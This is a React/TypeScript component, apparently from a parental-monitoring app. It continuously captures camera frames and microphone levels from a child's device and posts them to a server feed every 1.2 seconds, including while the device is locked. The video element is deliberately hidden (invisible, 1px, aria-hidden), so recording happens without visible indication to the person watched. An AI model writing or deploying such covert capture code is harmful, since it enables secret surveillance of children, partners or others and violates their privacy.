import React, { useEffect, useRef, useState } from 'react';
import { Camera, Mic } from 'lucide-react';

interface MediaSessionManagerProps {
  mode: 'CAMERA' | 'MICROPHONE' | 'BOTH' | 'LIVE_VIEW' | null;
  isActive: boolean;
  isLocked?: boolean;
  childId?: number;
  onMediaCaptured?: (data: { type: string; previewUrl?: string; audioLevel?: number }) => void;
}

export const MediaSessionManager: React.FC<MediaSessionManagerProps> = ({
  mode,
  isActive,
  isLocked = false,
  childId = 1,
  onMediaCaptured,
}) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const streamIntervalRef = useRef<any>(null);
  const animationFrameRef = useRef<number | null>(null);

  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [audioLevel, setAudioLevel] = useState<number>(0);

  // Background Media Engine - continuous capture regardless of lock status
  useEffect(() => {
    if (!isActive || !mode) {
      cleanupMedia();
      return;
    }

    let isMounted = true;

    async function startMedia() {
      try {
        const needsVideo = mode === 'CAMERA' || mode === 'BOTH' || mode === 'LIVE_VIEW';
        const needsAudio = mode === 'MICROPHONE' || mode === 'BOTH' || mode === 'LIVE_VIEW';

        const constraints: MediaStreamConstraints = {
          video: needsVideo ? { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } : false,
          audio: needsAudio ? true : false,
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        if (!isMounted) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }

        mediaStreamRef.current = stream;
        setHasPermission(true);

        if (needsVideo && videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((e) => console.log('Video play background:', e));
        }

        // Attach audio analyzer if mic is needed
        if (needsAudio) {
          try {
            const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
            audioContextRef.current = audioCtx;
            const source = audioCtx.createMediaStreamSource(stream);
            const analyser = audioCtx.createAnalyser();
            analyser.fftSize = 256;
            source.connect(analyser);

            const dataArray = new Uint8Array(analyser.frequencyBinCount);

            const updateVolume = () => {
              if (!isMounted) return;
              analyser.getByteFrequencyData(dataArray);
              let sum = 0;
              for (let i = 0; i < dataArray.length; i++) {
                sum += dataArray[i];
              }
              const avg = sum / dataArray.length;
              const normalized = Math.min(100, Math.round((avg / 255) * 100));
              setAudioLevel(normalized);
              onMediaCaptured?.({ type: 'MICROPHONE', audioLevel: normalized });

              animationFrameRef.current = requestAnimationFrame(updateVolume);
            };
            updateVolume();
          } catch (e) {
            console.log('Audio Context setup:', e);
          }
        }

        // Continuous streaming loop: capture canvas frame & post to server in background
        streamIntervalRef.current = setInterval(() => {
          if (!isMounted) return;

          let frameDataUrl: string | undefined = undefined;

          if (needsVideo && videoRef.current && videoRef.current.videoWidth > 0) {
            try {
              const canvas = document.createElement('canvas');
              canvas.width = 320;
              canvas.height = 240;
              const ctx = canvas.getContext('2d');
              if (ctx) {
                ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                frameDataUrl = canvas.toDataURL('image/jpeg', 0.6);
                onMediaCaptured?.({ type: 'CAMERA', previewUrl: frameDataUrl });
              }
            } catch (err) {
              console.log('Frame capture:', err);
            }
          }

          // Push to server stream endpoint so parent receives real-time live feed
          fetch('/api/stream/feed', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              child_id: childId,
              latest_frame: frameDataUrl,
              audio_level: audioLevel,
              device_locked: isLocked,
            }),
          }).catch(() => {});
        }, 1200);
      } catch (err: any) {
        console.warn('Background media capture permission notice:', err);
        setHasPermission(false);
      }
    }

    startMedia();

    return () => {
      isMounted = false;
      cleanupMedia();
    };
  }, [isActive, mode, isLocked, childId]);

  const cleanupMedia = () => {
    if (streamIntervalRef.current) {
      clearInterval(streamIntervalRef.current);
      streamIntervalRef.current = null;
    }
    if (animationFrameRef.current) {
      cancelAnimationFrame(animationFrameRef.current);
      animationFrameRef.current = null;
    }
    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach((t) => t.stop());
      mediaStreamRef.current = null;
    }
    if (audioContextRef.current) {
      audioContextRef.current.close().catch(() => {});
      audioContextRef.current = null;
    }
  };

  // Video element runs hidden in the background for frame capture
  return (
    <div className="hidden" aria-hidden="true">
      <video
        ref={videoRef}
        muted
        playsInline
        autoPlay
        style={{ width: '1px', height: '1px', opacity: 0, pointerEvents: 'none' }}
      />
    </div>
  );
};

